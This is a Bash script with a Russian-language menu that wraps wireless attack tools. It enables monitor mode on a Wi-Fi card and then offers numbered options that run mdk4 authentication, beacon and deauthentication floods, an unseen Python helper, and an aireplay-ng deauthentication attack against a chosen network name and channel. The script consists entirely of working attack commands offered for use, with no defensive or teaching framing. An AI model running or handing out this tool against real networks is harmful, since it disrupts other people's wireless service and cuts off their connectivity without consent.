#!/bin/bash
clear
readonly ru1=$(dirname $(readlink -f "$0"))
readonly ru=${ru1//language}
clear
source /$ru/disig
read -p "WIFI модуль: " module
airmon-ng stop ${module}mon
airmon-ng start $module
clear
source /$ru/disig
while true; do
         echo -e  "\e[33mВыберите атаку "
	 echo ""
	 echo "[1] Атака A"
	 echo "[2] Атака B"
	 echo "[3] Атака C"
 	 echo "[4] Атака D"
	 echo "[5] Атака E"
	echo ""
	 echo -e "\e[31m[8] Помощь"
	  echo -e "[9] Назад\e[0m"
	  read -p "Attack> " attack
         case $attack in 
	 [1Aa] )
	clear
	source /$ru/disig
	 gnome-terminal --geometry=1x1 --command="airodump-ng ${module}mon"
         mdk4 ${module}mon a
	clear;;
	 [2Bb] ) clear 
	source /$ru/disig
	 mdk4 ${module}mon b -ams 500;; 
        [3Cc]) clear
	source /$ru/disig
         python $ru/source/source -i ${module}mon
	clear
	source /$ru/disig;;
        [4Dd]) clear
	source /$ru/disig
	mdk4 ${module}mon d;;
	 [5Ee]) clear
	source /$ru/disig
	 gnome-terminal --geometry=132x24 --command="airodump-ng ${module}mon"
	clear
	source /$ru/disig 
	read -p "Канал: " ch
	 read -p "ESSID: " essid
	 read -p "Кол-во пакетов: " pack
	  iwconfig ${module}mon channel $ch
	clear
	source /$ru/disig
	 aireplay-ng -0 $pack -e $essid ${module}mon
	clear
	source /$ru/disig;;
	[9exit])
	clear
	source /$ru/disig
	airmon-ng stop ${module}mon
	NetworkManager
	clear
	source /$ru/disig
	/$ru/wkbye.sh ;;
	[8help])
	clear
	source $ru/help/helpru.sh;;
	* ) clear
	source /$ru/disig;;
esac
done